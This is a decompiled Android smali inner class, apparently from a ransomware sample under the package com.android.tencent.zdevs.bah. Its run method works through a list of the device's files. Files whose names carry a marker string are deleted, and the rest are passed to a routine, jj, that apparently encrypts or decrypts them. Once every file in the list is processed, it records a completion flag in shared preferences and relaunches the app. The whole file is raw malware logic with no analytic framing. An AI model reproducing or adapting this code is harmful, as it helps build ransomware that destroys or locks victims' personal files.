.class Lcom/android/tencent/zdevs/bah/sss$100000001;
.super Ljava/lang/Object;
.source "sss.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/android/tencent/zdevs/bah/sss;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000001"
.end annotation


# instance fields
.field private final val$cn:Landroid/content/Context;

.field private final val$cs:Ljava/lang/String;

.field private final val$file:Ljava/io/File;

.field private final val$op:I


# direct methods
.method constructor <init>(Ljava/io/File;Ljava/lang/String;ILandroid/content/Context;)V
    .locals 8

    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move v3, p3

    move-object v4, p4

    move-object v6, v0

    invoke-direct {v6}, Ljava/lang/Object;-><init>()V

    move-object v6, v0

    move-object v7, v1

    iput-object v7, v6, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$file:Ljava/io/File;

    move-object v6, v0

    move-object v7, v2

    iput-object v7, v6, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$cs:Ljava/lang/String;

    move-object v6, v0

    move v7, v3

    iput v7, v6, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$op:I

    move-object v6, v0

    move-object v7, v4

    iput-object v7, v6, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$cn:Landroid/content/Context;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 67
    move-object v0, p0

    move-object v6, v0

    iget-object v6, v6, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$file:Ljava/io/File;

    invoke-virtual {v6}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v6

    new-instance v7, Ljava/lang/StringBuffer;

    move-object v9, v7

    move-object v7, v9

    move-object v8, v9

    invoke-direct {v8}, Ljava/lang/StringBuffer;-><init>()V

    const-string v8, "!\uff01"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v7

    sget-object v8, Lcom/android/tencent/zdevs/bah/MainActivity;->hz:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_1

    .line 68
    move-object v6, v0

    iget-object v6, v6, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$file:Ljava/io/File;

    invoke-virtual {v6}, Ljava/io/File;->delete()Z

    move-result v6

    .line 72
    :goto_0
    const/4 v6, 0x1

    sget v7, Lcom/android/tencent/zdevs/bah/sss;->aa:I

    add-int/2addr v6, v7

    sput v6, Lcom/android/tencent/zdevs/bah/sss;->aa:I

    .line 73
    sget-object v6, Lcom/android/tencent/zdevs/bah/sss;->lstFile:Ljava/util/List;

    invoke-interface {v6}, Ljava/util/List;->size()I

    move-result v6

    sget v7, Lcom/android/tencent/zdevs/bah/sss;->aa:I

    if-gt v6, v7, :cond_0

    .line 74
    const/4 v6, 0x0

    sput v6, Lcom/android/tencent/zdevs/bah/sss;->aa:I

    .line 75
    new-instance v6, Ljava/util/ArrayList;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    invoke-direct {v7}, Ljava/util/ArrayList;-><init>()V

    sput-object v6, Lcom/android/tencent/zdevs/bah/sss;->lstFile:Ljava/util/List;

    .line 77
    move-object v6, v0

    iget-object v6, v6, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$cn:Landroid/content/Context;

    const-string v7, "XH"

    const/4 v8, 0x0

    invoke-virtual {v6, v7, v8}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v6

    move-object v2, v6

    .line 78
    move-object v6, v2

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    move-object v3, v6

    .line 79
    move-object v6, v3

    const-string v7, "cjk"

    const/4 v8, 0x1

    invoke-interface {v6, v7, v8}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    .line 80
    move-object v6, v3

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result v6

    .line 81
    sget-object v6, Lcom/android/tencent/zdevs/bah/MainActivity;->instance:Lcom/android/tencent/zdevs/bah/MainActivity;

    invoke-virtual {v6}, Lcom/android/tencent/zdevs/bah/MainActivity;->finish()V

    .line 82
    move-object v6, v0

    iget-object v6, v6, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$cn:Landroid/content/Context;

    invoke-virtual {v6}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v6

    move-object v7, v0

    iget-object v7, v7, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$cn:Landroid/content/Context;

    invoke-virtual {v7}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v6

    move-object v4, v6

    .line 83
    move-object v6, v4

    const/high16 v7, 0x4000000

    invoke-virtual {v6, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v6

    .line 84
    move-object v6, v0

    iget-object v6, v6, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$cn:Landroid/content/Context;

    move-object v7, v4

    invoke-virtual {v6, v7}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :cond_0
    return-void

    .line 70
    :cond_1
    move-object v6, v0

    iget-object v6, v6, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$file:Ljava/io/File;

    move-object v7, v0

    iget-object v7, v7, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$cs:Ljava/lang/String;

    move-object v8, v0

    iget v8, v8, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$op:I

    invoke-static {v6, v7, v8}, Lcom/android/tencent/zdevs/bah/sss;->jj(Ljava/io/File;Ljava/lang/String;I)V

    goto :goto_0
.end method
